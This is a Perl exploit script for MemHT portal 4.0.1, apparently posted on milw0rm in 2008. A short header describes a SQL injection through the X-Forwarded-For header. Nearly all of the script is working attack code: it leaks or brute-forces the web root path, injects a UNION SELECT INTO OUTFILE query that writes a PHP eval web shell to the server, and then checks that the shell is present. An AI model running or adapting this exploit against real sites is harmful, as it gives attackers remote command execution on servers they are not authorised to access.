#!/usr/bin/perl

=about

 MemHT 4.0.1 Perl exploit

 AUTHOR
    discovered & written by Ams
    ax330d [doggy] gmail [dot] com

 VULN. DESCRIPTION:
    Due to weak params filtering we are able to make
    SQL-Injection. So,
        1. Look at 'inc/ajax/ajax_rating.php', line ~ 29.
    It is not enough to check whether script has been accessed from
    main file. Better define some value.
        2. 'inc/inc_login.php' line ~ 35. Here we are able to send and
    bypass any IP. That eregi does not help, look at exploit in injection,
    comma is the last one.

    As proof this exploit creates simple shell.

 REQUIREMENTS:
    MySQL should be able to write to file
	Know full server path to portal

=cut

use strict;
use warnings;
use IO::Socket;

print "
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	  MemHT portal 4.0.1 Perl exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	";

my $expl_url  = shift or &usage;
my $serv_path = shift || '-b';
my $def_shell = '/uploads/file/files.php';
# 	Simple concept shell
my $shell = '<?php @eval($_GET[cmd]);';

my @paths = qw(
	/var/www/htdocs /var/www/localhost/htdocs /var/www /var/wwww/hosting /var/www/html /var/www/vhosts
	/home/www  /home/httpd/vhosts
	/usr/local/apache/htdocs
	/www/htdocs
);

@paths = ( $serv_path ) unless $serv_path eq '-b';

exploit( $expl_url );

sub exploit {

	#	Defining vars.
	$_ = shift;
	$_ .= '/' unless substr($_, -1) eq '/';
	print "\n\tExploiting:\t $_\n";

	my($packet, $rcvd, $injection);
	my($prot, $host, $path, ) = m{(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?};

	#	Trying to get /lang/english.php to get server path
	$packet  = "POST $path/lang/english.php HTTP/1.1\r\n";
	$packet .= "Host: $host\r\n";
	$packet .= "Connection: Close\r\n";
	$packet .= "Content-Type: application/x-www-form-urlencoded\r\n\r\n";
	$rcvd = send_pckt($host, $packet, 1);

	die "\n\tUnable to connect to $host!\n\n" unless $rcvd;

	if( $rcvd =~ /Undefined variable:/ ) {
		@paths = ($rcvd =~ m#\s+in\s+(.*?)${path}lang/english.php#);
		print "\n\tFound path:\t $paths[-1]\n";
	} else {
		print "\n\tStarting bruteforce...\n";
	}

	#	Some bruteforce here if path is not defined
	for $serv_path ( @paths ) {

        $injection = "' UNION SELECT '$shell' INTO OUTFILE '$serv_path$path$def_shell'-- /*,";

		print "\n\tTesting:\t $serv_path$path$def_shell ...\n";

		#	Sending poisoned request
		$packet  = "GET $path/inc/ajax/ajax_rating.php HTTP/1.1\r\n";
		$packet .= "Host: $host\r\n";
        $packet .= "X-Forwarded-For:$injection\r\n";
        $packet .= "Referer:http://$host$path/index.php\r\n";
		$packet .= "Connection: Close\r\n";
		$packet .= "Content-Type: application/x-www-form-urlencoded\r\n\r\n";

		send_pckt($host, $packet, 1) or die "\n\tUnable to connect to http://$host!\n\n";
	}

	#	Checking for shell presence
	$packet  = "HEAD $path$def_shell HTTP/1.1\r\n";
	$packet .= "Host: $host\r\n";
	$packet .= "Connection: Close\r\n";
	$packet .= "Content-Type: application/x-www-form-urlencoded\r\n\r\n";

	$rcvd = send_pckt($host, $packet, 1);
	if( ! $rcvd) {
		print "\n\tUnable to connect to $host\n\n";
		exit;
	}

	if( $rcvd =~ /200\s+OK/ ) {
		print "\n\tExploited:\t http://$host$path$def_shell\n\n";
	} else {
		print "\n\tExploiting failed.\n\n";
	}

}

sub send_pckt() {

	my $dat;
	my ($host, $packet, $ret) = @_;
	my $socket = IO::Socket::INET->new(
		Proto    => 'tcp',
		PeerAddr => $host,
		PeerPort => 80
	);
	if( ! $socket) {
		return 0;
	} else {

		print $socket $packet;
		if( $ret ) {
			local $/;
			$dat = <$socket>;
		}
		close $socket;
		return $dat;
	}
}

sub usage {
	print "\n\tUsage:\t$0 http://site.com [-b|full server path]

	By default exlpoit checks /lang/english.php for errors to get real path,
	If path could not be found exploit will bruteforce it ( or if used -b or none path is specified ).

	Example:\t$0 http://localhost/ /var/www/htdocs
			$0 http://localhost/ -b
			$0 http://localhost/\n\n";
	exit;
}

# milw0rm.com [2008-11-13]